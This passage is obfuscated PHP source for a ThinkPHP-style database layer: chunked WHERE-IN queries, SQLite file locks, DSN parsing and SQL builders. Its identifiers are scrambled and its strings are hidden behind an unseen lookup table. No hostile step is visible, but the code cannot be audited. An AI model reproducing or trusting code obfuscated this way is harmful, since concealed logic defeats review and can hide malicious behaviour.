$íÁñöĞØ; } public function save($ñÇèó¥‹ = '', $öÄëå—” = array()) { $‚ĞÜÓ¿´ =& $_SERVER[ĞÆÏ¡Îª]; $©†èãëû = self::SQL_WHERE_IN_CHUNK; $õ‹ì‡á = $this->optionsValue(); $§‡òÂ·Õ = $this->findWhereField($õ‹ì‡á); if (!$§‡òÂ·Õ) { return parent::save($ñÇèó¥‹, $öÄëå—”); } $ÌÎçÖƒç = 0; $ÜÁ‰£Ÿê = $õ‹ì‡á[$‚ĞÜÓ¿´[284]][$§‡òÂ·Õ][1]; $ÜÁ‰£Ÿê = is_array($ÜÁ‰£Ÿê) ? $ÜÁ‰£Ÿê : array(); $¼Ö•‡ç” = count($ÜÁ‰£Ÿê); for ($ûéñÃøœ = 0; $ûéñÃøœ < $¼Ö•‡ç”; $ûéñÃøœ += $©†èãëû) { $‹ÍÂ·° = array_slice($ÜÁ‰£Ÿê, $ûéñÃøœ, $©†èãëû); if (!is_array($‹ÍÂ·°) || count($‹ÍÂ·°) == 0) { break; } $õ‹ì‡á[$‚ĞÜÓ¿´[284]][$§‡òÂ·Õ][1] = $‹ÍÂ·°; $this->optionsValue($õ‹ì‡á); $ÌÎçÖƒç += parent::save($ñÇèó¥‹, $öÄëå—”); $this->chunkEventCheck(count($‹ÍÂ·°)); } $this->chunkEventSet(); return $ÌÎçÖƒç; } public function add($ã‰©”é­ = '', $ÑÏîÓòç = array(), $‡ùÂ«ñÔ = false) { if ($this->addTaskStatus && is_array($ã‰©”é­)) { $this->addTaskData[] = $ã‰©”é­; return; } return parent::add($ã‰©”é­, $ÑÏîÓòç, $‡ùÂ«ñÔ); } public function parseWhereLike($¤âÇå À, $Ó¨ê¥¥© = '', $èüÁ¼Õ = false, &$€îĞÉòÅ = false) { $ÔÍÉ¡×ã =& $_SERVER[ĞÆÏ¡Îª]; $í‰ØÕ´Ç = $GLOBALS[$ÔÍÉ¡×ã[6]][$ÔÍÉ¡×ã[389]]; if (!$í‰ØÕ´Ç[$ÔÍÉ¡×ã[390]]) { return $¤âÇå À; } if (!is_array($¤âÇå À)) { return $¤âÇå À; } $İ†ÜË÷ = array(); $¾š†‡¸‰ = 0; foreach ($¤âÇå À as $õĞ™Ìß¿ => $—ğÀßøÖ) { if (is_array($—ğÀßøÖ) && count($—ğÀßøÖ) == 2 && $—ğÀßøÖ[0] == $ÔÍÉ¡×ã[391] && is_string($—ğÀßøÖ[1]) && substr($—ğÀßøÖ[1], 0, 1) == $ÔÍÉ¡×ã[392] && substr($—ğÀßøÖ[1], strlen($—ğÀßøÖ[1]) - 1, 1) == $ÔÍÉ¡×ã[392]) { $€îĞÉòÅ = !0; $ ¬­ßÃÂ = is_string($õĞ™Ìß¿) ? $õĞ™Ìß¿ : $Ó¨ê¥¥©; $Ì€¾şÜÃ = substr($—ğÀßøÖ[1], 1, strlen($—ğÀßøÖ[1]) - 2); $Ì€¾şÜÃ = $this->db->escapeString($Ì€¾şÜÃ); if (!strpos($ ¬­ßÃÂ, $ÔÍÉ¡×ã[10])) { $ ¬­ßÃÂ = $ÔÍÉ¡×ã[393] . $ ¬­ßÃÂ . $ÔÍÉ¡×ã[393]; } $ı›°…Ã = $ÔÍÉ¡×ã[188] . $Ì€¾şÜÃ . $ÔÍÉ¡×ã[188]; $Ì€¾şÜÃ = str_replace(array($ÔÍÉ¡×ã[10], $ÔÍÉ¡×ã[394], $ÔÍÉ¡×ã[11]), $ÔÍÉ¡×ã[395], $Ì€¾şÜÃ); if ($í‰ØÕ´Ç[$ÔÍÉ¡×ã[396]]) { $ı›°…Ã = $ÔÍÉ¡×ã[397] . $Ì€¾şÜÃ . $ÔÍÉ¡×ã[398]; if ($í‰ØÕ´Ç[$ÔÍÉ¡×ã[399]]) { $ı›°…Ã = $ÔÍÉ¡×ã[398] . $Ì€¾şÜÃ . $ÔÍÉ¡×ã[397]; } } $İ†ÜË÷[$¾š†‡¸‰] = $ÔÍÉ¡×ã[400] . $ ¬­ßÃÂ . $ÔÍÉ¡×ã[401] . $ı›°…Ã . $ÔÍÉ¡×ã[402]; $¾š†‡¸‰++; continue; } if (is_array($—ğÀßøÖ)) { $Ó¨ê¥¥© = is_string($õĞ™Ìß¿) ? $õĞ™Ìß¿ : $Ó¨ê¥¥©; $—ğÀßøÖ = $this->parseWhereLike($—ğÀßøÖ, $Ó¨ê¥¥©, !0, $€îĞÉòÅ); } if (is_numeric($õĞ™Ìß¿)) { $İ†ÜË÷[$¾š†‡¸‰] = $—ğÀßøÖ; $¾š†‡¸‰++; } else { $İ†ÜË÷[$õĞ™Ìß¿] = $—ğÀßøÖ; } } if ($€îĞÉòÅ && !$èüÁ¼Õ) { } return $İ†ÜË÷; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($íáÚáÍ˜ = array()) { $´š¥Ÿ»‰ =& $_SERVER[ĞÆÏ¡Îª]; $ü«æ‹­¦ = self::SQL_WHERE_IN_CHUNK; $¡¡ëııî = $this->optionsValue(); $Õ„ÂüÊ€ = $this->findWhereField($¡¡ëııî); if (!$Õ„ÂüÊ€ || isset($¡¡ëııî[$´š¥Ÿ»‰[301]]) || isset($¡¡ëııî[$´š¥Ÿ»‰[362]])) { return parent::select($íáÚáÍ˜); } $î¿×ê‰Ô = $¡¡ëııî[$´š¥Ÿ»‰[284]][$Õ„ÂüÊ€][1]; $î¿×ê‰Ô = is_array($î¿×ê‰Ô) ? $î¿×ê‰Ô : array(); $”Ş—¹ÏÈ = null; for ($ÎÅı€°¢ = 0; $ÎÅı€°¢ < count($î¿×ê‰Ô); $ÎÅı€°¢ += $ü«æ‹­¦) { $´£Åáì = array_slice($î¿×ê‰Ô, $ÎÅı€°¢, $ü«æ‹­¦); if (!is_array($´£Åáì) || count($´£Åáì) == 0) { break; } $¡¡ëııî[$´š¥Ÿ»‰[284]][$Õ„ÂüÊ€][1] = $´£Åáì; $this->optionsValue($¡¡ëııî); $î€Ì­ª‡ = parent::select($íáÚáÍ˜); if (!$î€Ì­ª‡) { continue; } $”Ş—¹ÏÈ = is_array($”Ş—¹ÏÈ) ? $”Ş—¹ÏÈ : array(); $”Ş—¹ÏÈ = array_merge($”Ş—¹ÏÈ, $î€Ì­ª‡); } return $”Ş—¹ÏÈ; } public function delete($ºÛ˜›¥Ã = array()) { $—¶Šä˜Ö =& $_SERVER[ĞÆÏ¡Îª]; $ÌŞ Èİá = self::SQL_WHERE_IN_CHUNK; $•¶¦Ç¨ñ = $this->optionsValue(); $‰¸Öëˆ² = $this->findWhereField($•¶¦Ç¨ñ); if (!$‰¸Öëˆ²) { return parent::delete($ºÛ˜›¥Ã); } $÷àĞÅíÜ = 0; $« §Í›œ = $•¶¦Ç¨ñ[$—¶Šä˜Ö[284]][$‰¸Öëˆ²][1]; $« §Í›œ = is_array($« §Í›œ) ? $« §Í›œ : array(); for ($ä•ûªİè = 0; $ä•ûªİè < count($« §Í›œ); $ä•ûªİè += $ÌŞ Èİá) { $ÈÁ´½æ¨ = array_slice($« §Í›œ, $ä•ûªİè, $ÌŞ Èİá); if (!is_array($ÈÁ´½æ¨) || count($ÈÁ´½æ¨) == 0) { break; } $•¶¦Ç¨ñ[$—¶Šä˜Ö[284]][$‰¸Öëˆ²][1] = $ÈÁ´½æ¨; $this->optionsValue($•¶¦Ç¨ñ); $÷àĞÅíÜ += parent::delete($ºÛ˜›¥Ã); } return $÷àĞÅíÜ; } private function findWhereField($‹Ë‰Ñêí) { $ÂÈ½ÙîÄ =& $_SERVER[ĞÆÏ¡Îª]; $Âıƒ‡Ì = self::SQL_WHERE_IN_CHUNK; if (!is_array($‹Ë‰Ñêí) || !is_array($‹Ë‰Ñêí[$ÂÈ½ÙîÄ[284]])) { return !1; } foreach ($‹Ë‰Ñêí[$ÂÈ½ÙîÄ[284]] as $¢®¬¬ˆœ => $à¦”­÷Õ) { if (is_array($à¦”­÷Õ) && isset($à¦”­÷Õ[0]) && is_string($à¦”­÷Õ[0]) && strtolower($à¦”­÷Õ[0]) == $ÂÈ½ÙîÄ[7] && is_array($à¦”­÷Õ[1]) && count($à¦”­÷Õ[1]) > $Âıƒ‡Ì) { ignore_timeout(); return $¢®¬¬ˆœ; } } return !1; } public function setMasterDB($‹’•¸µ„ = true) { think_config($_SERVER[ĞÆÏ¡Îª][403], $‹’•¸µ„); } } goto c£ôÔ†‹¬Ö; DšäÚÀîÄÅ: class DbSqlite extends DbSqliteBase { public function query($ŸÁ«²ÙÈ) { $ê—ø««‚ =& $_SERVER[ĞÆÏ¡Îª]; if (!CacheLock::fileLock($ê—ø««‚[13])) { return !1; } $˜éÆë•ø = parent::query($ŸÁ«²ÙÈ); CacheLock::fileUnLock($ê—ø««‚[13]); return $˜éÆë•ø; } public function execute($×‚˜€òĞ) { $ˆãÁ™Ó =& $_SERVER[ĞÆÏ¡Îª]; if (!CacheLock::fileLock($ˆãÁ™Ó[13])) { return !1; } $…üïÂ™Å = parent::execute($×‚˜€òĞ); CacheLock::fileUnLock($ˆãÁ™Ó[13]); return $…üïÂ™Å; } } class DbSqlite3 extends DbSqlite3Base { public function query($¸÷úŠ–¯) { $”¢âÑÏ =& $_SERVER[ĞÆÏ¡Îª]; if (!CacheLock::fileLock($”¢âÑÏ[13])) { return !1; } $ØÙ¿‹€Ø = parent::query($¸÷úŠ–¯); CacheLock::fileUnLock($”¢âÑÏ[13]); return $ØÙ¿‹€Ø; } public function execute($ƒùç•ñê) { $¡ï…Êô =& $_SERVER[ĞÆÏ¡Îª]; if (!CacheLock::fileLock($¡ï…Êô[13])) { return !1; } $Ü‘š«à„ = parent::execute($ƒùç•ñê); CacheLock::fileUnLock($¡ï…Êô[13]); return $Ü‘š«à„; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\161" => "\x3c\76", "\147\164" => "\76", "\145\x67\x74" => "\x3e\x3d", "\x6c\164" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\157\x74\x6c\151\153\145" => "\x4e\117\124\40\114\111\113\x45", "\154\x69\x6b\x65" => "\x4c\111\x4b\105", "\x69\x6e" => "\x49\116", "\156\x6f\x74\x69\156" => "\x4e\117\x54\40\111\116", "\156\x6f\164\40\151\156" => "\x4e\117\x54\x20\111\x4e", "\142\x65\x74\x77\145\x65\x6e" => "\x42\x45\x54\x57\105\x45\x4e", "\x6e\x6f\164\x62\x65\164\x77\145\145\x6e" => "\116\117\124\x20\x42\105\x54\x57\x45\105\x4e", "\x6e\x6f\x74\40\142\145\164\x77\x65\145\x6e" => "\x4e\x4f\124\x20\x42\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\105\x4c\x45\103\124\45\x44\111\123\124\111\x4e\x43\124\x25\x20\45\x46\111\105\114\x44\45\x20\x46\122\x4f\115\40\x25\124\101\102\114\x45\x25\45\x4a\117\111\116\x25\45\127\x48\105\x52\x45\45\45\x47\122\x4f\125\x50\45\x25\x48\x41\126\x49\116\107\x25\45\x4f\122\x44\105\122\x25\x25\x4c\111\115\x49\124\x25\40\45\x55\x4e\x49\117\x4e\x25\45\x43\x4f\115\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $’µ¤—ÜØ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ĞÆÏ¡Îª][951], $’µ¤—ÜØ); } public function factory($ÜÓ§†„ = '') { $úŞ»éæ€ =& $_SERVER[ĞÆÏ¡Îª]; $ÜÓ§†„ = $this->parseConfig($ÜÓ§†„); if (empty($ÜÓ§†„[$úŞ»éæ€[952]])) { think_exception(think_lang($úŞ»éæ€[953])); } $this->dbType = ucwords(strtolower($ÜÓ§†„[$úŞ»éæ€[952]])); $Ğı’éòË = $úŞ»éæ€[954] . $this->dbType; if (class_exists($Ğı’éòË)) { $¥ëìòÛ• = new $Ğı’éòË($ÜÓ§†„); if ($úŞ»éæ€[955] != strtolower($ÜÓ§†„[$úŞ»éæ€[952]])) { $¥ëìòÛ•->dbType = strtoupper($this->dbType); } else { $¥ëìòÛ•->dbType = $this->_getDsnType($ÜÓ§†„[$úŞ»éæ€[907]]); } } else { think_exception(think_lang($úŞ»éæ€[956]) . $úŞ»éæ€[957] . $Ğı’éòË); } return $¥ëìòÛ•; } public function __call($çèê³ÌÓ, $ÎáÕé°¶) { if (method_exists($this, $çèê³ÌÓ)) { return call_user_func_array(array($this, $çèê³ÌÓ), $ÎáÕé°¶); } } protected function _getDsnType($‘§ç°¡Á) { $²¢â²† = explode($_SERVER[ĞÆÏ¡Îª][4], $‘§ç°¡Á); $¾Ñğ¡ê = strtoupper(trim($²¢â²†[0])); return $¾Ñğ¡ê; } private function parseConfig($Œ¢Ëş”– = '') { $ô¨ÜÅÃ =& $_SERVER[ĞÆÏ¡Îª]; if (!empty($Œ¢Ëş”–) && is_string($Œ¢Ëş”–)) { $Œ¢Ëş”– = $this->parseDSN($Œ¢Ëş”–); } elseif (is_array($Œ¢Ëş”–)) { $Œ¢Ëş”– = array_change_key_case($Œ¢Ëş”–); $Œ¢Ëş”– = array($ô¨ÜÅÃ[952] => $Œ¢Ëş”–[$ô¨ÜÅÃ[958]], $ô¨ÜÅÃ[879] => $Œ¢Ëş”–[$ô¨ÜÅÃ[959]], $ô¨ÜÅÃ[880] => $Œ¢Ëş”–[$ô¨ÜÅÃ[960]], $ô¨ÜÅÃ[877] => $Œ¢Ëş”–[$ô¨ÜÅÃ[961]], $ô¨ÜÅÃ[878] => $Œ¢Ëş”–[$ô¨ÜÅÃ[962]], $ô¨ÜÅÃ[21] => $Œ¢Ëş”–[$ô¨ÜÅÃ[963]], $ô¨ÜÅÃ[907] => $Œ¢Ëş”–[$ô¨ÜÅÃ[964]], $ô¨ÜÅÃ[17] => isset($Œ¢Ëş”–[$ô¨ÜÅÃ[965]]) ? $Œ¢Ëş”–[$ô¨ÜÅÃ[965]] : array()); } elseif (empty($Œ¢Ëş”–)) { if (think_config($ô¨ÜÅÃ[966]) && $ô¨ÜÅÃ[955] != strtolower(think_config($ô¨ÜÅÃ[967]))) { $Œ¢Ëş”– = $this->parseDSN(think_config($ô¨ÜÅÃ[966])); } else { $Œ¢Ëş”– = array($ô¨ÜÅÃ[952] => think_config($ô¨ÜÅÃ[967]), $ô¨ÜÅÃ[879] => think_config($ô¨ÜÅÃ[968]), $ô¨ÜÅÃ[880] => think_config($ô¨ÜÅÃ[969]), $ô¨ÜÅÃ[877] => think_config($ô¨ÜÅÃ[970]), $ô¨ÜÅÃ[878] => think_config($ô¨ÜÅÃ[971]), $ô¨ÜÅÃ[21] => think_config($ô¨ÜÅÃ[255]), $ô¨ÜÅÃ[907] => think_config($ô¨ÜÅÃ[966]), $ô¨ÜÅÃ[17] => think_config($ô¨ÜÅÃ[972])); } } return $Œ¢Ëş”–; } protected function initConnect($çïöõ½ = true) { if (1 == think_config($_SERVER[ĞÆÏ¡Îª][22])) { $this->_linkID = $this->multiConnect($çïöõ½); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ëí·ñ™Œ => $¯çİÑ‹†) { $this->_linkID = $¯çİÑ‹†; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($²Ö‰ÀÛÁ = false) { $ğ¢êßƒî =& $_SERVER[ĞÆÏ¡Îª]; static $İ«„Û°· = array(); static $×ÓØ« = -1; if (empty($İ«„Û°·)) { foreach ($this->config as $şëéì¹å => $²×Î·Ÿ) { $İ«„Û°·[$şëéì¹å] = explode($ğ¢êßƒî[50], $²×Î·Ÿ); } } if (think_config($ğ¢êßƒî[973])) { if ($²Ö‰ÀÛÁ || think_config($ğ¢êßƒî[403]) === !0) { $Œåšè‹ã = floor(mt_rand(0, think_config($ğ¢êßƒî[974]) - 1)); $×ÓØ« = $Œåšè‹ã; } else { if (is_numeric(think_config($ğ¢êßƒî[975]))) { $Œåšè‹ã = think_config($ğ¢êßƒî[975]); } else { $Œåšè‹ã = floor(mt_rand(think_config($ğ¢êßƒî[974]), count($İ«„Û°·[$ğ¢êßƒî[877]]) - 1)); } } } else { $Œåšè‹ã = floor(mt_rand(0, count($İ«„Û°·[$ğ¢êßƒî[877]]) - 1)); $×ÓØ« = $Œåšè‹ã; } $Œåšè‹ã = $×ÓØ« !== -1 ? $×ÓØ« : $Œåšè‹ã; $Š¥ï«…æ = array($ğ¢êßƒî[879] => isset($İ«„Û°·[$ğ¢êßƒî[879]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[879]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[879]][0], $ğ¢êßƒî[880] => isset($İ«„Û°·[$ğ¢êßƒî[880]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[880]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[880]][0], $ğ¢êßƒî[877] => isset($İ«„Û°·[$ğ¢êßƒî[877]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[877]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[877]][0], $ğ¢êßƒî[878] => isset($İ«„Û°·[$ğ¢êßƒî[878]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[878]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[878]][0], $ğ¢êßƒî[21] => isset($İ«„Û°·[$ğ¢êßƒî[21]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[21]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[21]][0], $ğ¢êßƒî[907] => isset($İ«„Û°·[$ğ¢êßƒî[907]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[907]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[907]][0], $ğ¢êßƒî[17] => isset($İ«„Û°·[$ğ¢êßƒî[17]][$Œåšè‹ã]) ? $İ«„Û°·[$ğ¢êßƒî[17]][$Œåšè‹ã] : $İ«„Û°·[$ğ¢êßƒî[17]][0]); return $this->connect($Š¥ï«…æ, $Œåšè‹ã); } public function parseDSN($¾œå Ãî) { $¶‚óØÓÎ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($¾œå Ãî)) { return !1; } $²áíæıÅ = parse_url($¾œå Ãî); if ($²áíæıÅ[$¶‚óØÓÎ[180]]) { $×ÅÕ¨¸¬ = array($¶‚óØÓÎ[952] => $²áíæıÅ[$¶‚óØÓÎ[180]], $¶‚óØÓÎ[879] => isset($²áíæıÅ[$¶‚óØÓÎ[609]]) ? $²áíæıÅ[$¶‚óØÓÎ[609]] : $¶‚óØÓÎ[12], $¶‚óØÓÎ[880] => isset($²áíæıÅ[$¶‚óØÓÎ[976]]) ? $²áíæıÅ[$¶‚óØÓÎ[976]] : $¶‚óØÓÎ[12], $¶‚óØÓÎ[877] => isset($²áíæıÅ[$¶‚óØÓÎ[181]]) ? $²áíæıÅ[$¶‚óØÓÎ[181]] : $¶‚óØÓÎ[12], $¶‚óØÓÎ[878] => isset($²áíæıÅ[$¶‚óØÓÎ[182]]) ? $²áíæıÅ[$¶‚óØÓÎ[182]] : $¶‚óØÓÎ[12], $¶‚óØÓÎ[21] => isset($²áíæıÅ[$¶‚óØÓÎ[84]]) ? substr($²áíæıÅ[$¶‚óØÓÎ[84]], 1) : $¶‚óØÓÎ[12]); } else { preg_match($¶‚óØÓÎ[977], trim($¾œå Ãî), $«¢ÏÙ); $×ÅÕ¨¸¬ = array($¶‚óØÓÎ[952] => $«¢ÏÙ[1], $¶‚óØÓÎ[879] => $«¢ÏÙ[2], $¶‚óØÓÎ[880] => $«¢ÏÙ[3], $¶‚óØÓÎ[877] => $«¢ÏÙ[4], $¶‚óØÓÎ[878] => $«¢ÏÙ[5], $¶‚óØÓÎ[21] => $«¢ÏÙ[6]); } $×ÅÕ¨¸¬[$¶‚óØÓÎ[907]] = $¶‚óØÓÎ[12]; return $×ÅÕ¨¸¬; } protected function debug() { $ãäªà =& $_SERVER[ĞÆÏ¡Îª]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ãäªà[978]; if (think_config($ãäªà[979])) { think_status($ãäªà[980]); think_trace($this->queryStr . $ãäªà[981] . think_status($ãäªà[24], $ãäªà[980], 6) . $ãäªà[982], $ãäªà[12], $ãäªà[983]); } } protected function parseLock($ë¶®Š• = false) { $ŞÙô˜—µ =& $_SERVER[ĞÆÏ¡Îª]; if (!$ë¶®Š•) { return $ŞÙô˜—µ[12]; } if ($ŞÙô˜—µ[909] == $this->dbType) { return $ŞÙô˜—µ[984]; } return $ŞÙô˜—µ[985]; } protected function parseSet($äÖ”áÖ†) { $×ÊúñÍ¦ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($äÖ”áÖ† as $Ö…ÔÌ• => $ÈÛíõÛ†) { if (is_array($ÈÛíõÛ†) && $×ÊúñÍ¦[306] == $ÈÛíõÛ†[0]) { $ÁÃ‰šÛû[] = $this->parseKey($Ö…ÔÌ•) . $×ÊúñÍ¦[875] . $ÈÛíõÛ†[1]; } elseif (is_scalar($ÈÛíõÛ†) || is_null($ÈÛíõÛ†)) { $ÁÃ‰šÛû[] = $this->parseKey($Ö…ÔÌ•) . $×ÊúñÍ¦[875] . $this->parseValue($ÈÛíõÛ†); } } return $×ÊúñÍ¦[986] . implode($×ÊúñÍ¦[50], $ÁÃ‰šÛû); } protected function bindParam($£Åøµ¨Â, $¥ñ˜ø®ò) { $this->bind[$_SERVER[ĞÆÏ¡Îª][4] . $£Åøµ¨Â] = $¥ñ˜ø®ò; } protected function parseBind($ÙãÛøÎõ) { $ÙãÛøÎõ = array_merge($this->bind, $ÙãÛøÎõ); $this->bind = array(); return $ÙãÛøÎõ; } function parseKey(&$ŸÛŒ•´, $ü½àÑ = true) { if ($ü½àÑ) { $ŸÛŒ•´ = $this->parseKeyCheck($ŸÛŒ•´); } return $ŸÛŒ•´; } function parseKeyCheck($­ø–¸ğŒ) { $ú¹ÛšŠ =& $_SERVER[ĞÆÏ¡Îª]; $­ø–¸ğŒ = trim($­ø–¸ğŒ); if (!preg_match($ú¹ÛšŠ[987], $­ø–¸ğŒ)) { think_exception($ú¹ÛšŠ[988] . $­ø–¸ğŒ); } return $­ø–¸ğŒ; } protected function parseValue($ÅâªÂĞÂ) { $ªÌ²…«À =& $_SERVER[ĞÆÏ¡Îª]; if (is_string($ÅâªÂĞÂ)) { $ÅâªÂĞÂ = $ªÌ²…«À[948] . $this->escapeString($ÅâªÂĞÂ) . $ªÌ²…«À[948]; } elseif (isset($ÅâªÂĞÂ[0]) && is_string($ÅâªÂĞÂ[0]) && strtolower($ÅâªÂĞÂ[0]) == $ªÌ²…«À[306]) { $ÅâªÂĞÂ = $this->escapeString($ÅâªÂĞÂ[1]); } elseif (is_array($ÅâªÂĞÂ)) { $ÅâªÂĞÂ = array_map(array($this, $ªÌ²…«À[949]), $ÅâªÂĞÂ); } elseif (is_bool($ÅâªÂĞÂ)) { $ÅâªÂĞÂ = $ÅâªÂĞÂ ? $ªÌ²…«À[88] : $ªÌ²…«À[197]; } elseif (is_null($ÅâªÂĞÂ)) { $ÅâªÂĞÂ = $ªÌ²…«À[103]; } return $ÅâªÂĞÂ; } protected function parseField($şü¿ ğĞ) { $êİ²©´ =& $_SERVER[ĞÆÏ¡Îª]; if (is_string($şü¿ ğĞ) && strpos($şü¿ ğĞ, $êİ²©´[50])) { $şü¿ ğĞ = explode($êİ²©´[50], $şü¿ ğĞ); } if (is_array($şü¿ ğĞ)) { $ŸêçÂÜÖ = array(); foreach ($şü¿ ğĞ as $Ç®ûß => $ù·šŸ Æ) { if (!is_numeric($Ç®ûß)) { $ŸêçÂÜÖ[] = $this->parseKey($Ç®ûß, !1) . $êİ²©´[989] . $this->parseKey($ù·šŸ Æ); } else { $ŸêçÂÜÖ[] = $this->parseKey($ù·šŸ Æ); } } $ÎÛÛ«ö¤ = implode($êİ²©´[50], $ŸêçÂÜÖ); } elseif (is_string($şü¿ ğĞ) && !empty($şü¿ ğĞ)) { $ÎÛÛ«ö¤ = $şü¿ ğĞ; } else { $ÎÛÛ«ö¤ = $êİ²©´[188]; } return $ÎÛÛ«ö¤; } protected function parseTable($­€Àœ»±) { $åØÓ«­ù =& $_SERVER[ĞÆÏ¡Îª]; if (is_array($­€Àœ»±)) { $ í›™ˆ = array(); foreach ($­€Àœ»± as $õœù”äÕ => $Ø»òãõ) { if (!is_numeric($õœù”äÕ)) { $ í›™ˆ[] = $this->parseKey($õœù”äÕ) . $åØÓ«­ù[53] . $this->parseKey($Ø»òãõ); } else { $ í›™ˆ[] = $this->parseKey($õœù”äÕ); } } $­€Àœ»± = $ í›™ˆ; } elseif (is_string($­€Àœ»±)) { if (strstr($­€Àœ»±, $åØÓ«­ù[53])) { return $­€Àœ»±; } $­€Àœ»± = explode($åØÓ«­ù[50], $­€Àœ»±); array_walk($­€Àœ»±, array($this, $åØÓ«­ù[897])); } return $åØÓ«­ù[891] . trim(implode($åØÓ«­ù[990], $­€Àœ»±), $åØÓ«­ù[393]) . $åØÓ«­ù[891]; } protected function parseWhere($œÆ¾×µ) { $ŸÏÃğÂÉ =& $_SERVER[ĞÆÏ¡Îª]; $éÖ¿¾ä¹ = $ŸÏÃğÂÉ[12]; if (is_string($œÆ¾×µ)) { $éÖ¿¾ä¹ = $œÆ¾×µ; } else { $­·Ã‹ß§ = isset($œÆ¾×µ[$ŸÏÃğÂÉ[991]]) ? strtoupper($œÆ¾×µ[$ŸÏÃğÂÉ[991]]) : $ŸÏÃğÂÉ[12]; if (in_array($­·Ã‹ß§, array($ŸÏÃğÂÉ[992], $ŸÏÃğÂÉ[993], $ŸÏÃğÂÉ[994]))) { $­·Ã‹ß§ = $ŸÏÃğÂÉ[53] . $­·Ã‹ß§ . $ŸÏÃğÂÉ[53]; unset($œÆ¾×µ[$ŸÏÃğÂÉ[991]]); } else { $­·Ã‹ß§ = $ŸÏÃğÂÉ[995]; } foreach ($œÆ¾×µ as $»Ù³µØü => $±öÂ„±é) { $éÖ¿¾ä¹ .= $ŸÏÃğÂÉ[286]; if (is_numeric($»Ù³µØü)) { $»Ù³µØü = $ŸÏÃğÂÉ[996]; } if (0 === strpos($»Ù³µØü, $ŸÏÃğÂÉ[11])) { $éÖ¿¾ä¹ .= $this->parseThinkWhere($»Ù³µØü, $±öÂ„±é); } else { if (!preg_match($ŸÏÃğÂÉ[997], trim($»Ù³µØü))) { think_exception(think_lang($ŸÏÃğÂÉ[998]) . $ŸÏÃğÂÉ[4] . $»Ù³µØü); } $« ’ŠÆ™ = is_array($±öÂ„±é) && isset($±öÂ„±é[$ŸÏÃğÂÉ[999]]); $»Ù³µØü = trim($»Ù³µØü); if (strpos($»Ù³µØü, $ŸÏÃğÂÉ[292])) { $û©éÂâÓ = explode($ŸÏÃğÂÉ[292], $»Ù³µØü); $–’ÂÆÌ = array(); foreach ($û©éÂâÓ as $…ªİá¼É => $üıŸšı) { $ò•Û×®Î = $« ’ŠÆ™ ? $±öÂ„±é[$…ªİá¼É] : $±öÂ„±é; $–’ÂÆÌ[] = $ŸÏÃğÂÉ[269] . $this->parseWhereItem($this->parseKey($üıŸšı), $ò•Û×®Î) . $ŸÏÃğÂÉ[896]; } $éÖ¿¾ä¹ .= implode($ŸÏÃğÂÉ[1000], $–’ÂÆÌ); } elseif (strpos($»Ù³µØü, $ŸÏÃğÂÉ[293])) { $û©éÂâÓ = explode($ŸÏÃğÂÉ[293], $»Ù³µØü); $–’ÂÆÌ = array(); foreach ($û©éÂâÓ as $…ªİá¼É => $üıŸšı) { $ò•Û×®Î = $« ’ŠÆ™ ? $±öÂ„±é[$…ªİá¼É] : $±öÂ„±é; $–’ÂÆÌ[] = $ŸÏÃğÂÉ[269] . $this->parseWhereItem($this->parseKey($üıŸšı), $ò•Û×®Î) . $ŸÏÃğÂÉ[896]; } $éÖ¿¾ä¹ .= implode($ŸÏÃğÂÉ[995], $–’ÂÆÌ); } else { $éÖ¿¾ä¹ .= $this->parseWhereItem($this->parseKey($»Ù³µØü), $±öÂ„±é); } } $éÖ¿¾ä¹ .= $ŸÏÃğÂÉ[287] . $­·Ã‹ß§; } $éÖ¿¾ä¹ = substr($éÖ¿¾ä¹, 0, -strlen($­·Ã‹ß§)); } return empty($éÖ¿¾ä¹) ? $ŸÏÃğÂÉ[12] : $ŸÏÃğÂÉ[1001] . $éÖ¿¾ä¹; } protected function parseWhereItem($ÓœËÙì, $§œßŒŠõ) { $³õ÷¯ñğ =& $_SERVER[ĞÆÏ¡Îª]; $ñå÷éÖ = $³õ÷¯ñğ[12]; if (is_array($§œßŒŠõ)) { if (is_string($§œßŒŠõ[0])) { $É»ºÖÃ— = strtolower($§œßŒŠõ[0]); if (in_array($§œßŒŠõ[0], array($³õ÷¯ñğ[875], $³õ÷¯ñğ[1002], $³õ÷¯ñğ[1003], $³õ÷¯ñğ[1004], $³õ÷¯ñğ[1005], $³õ÷¯ñğ[1006]))) { $ñå÷éÖ .= $ÓœËÙì . $³õ÷¯ñğ[53] . $§œßŒŠõ[0] . 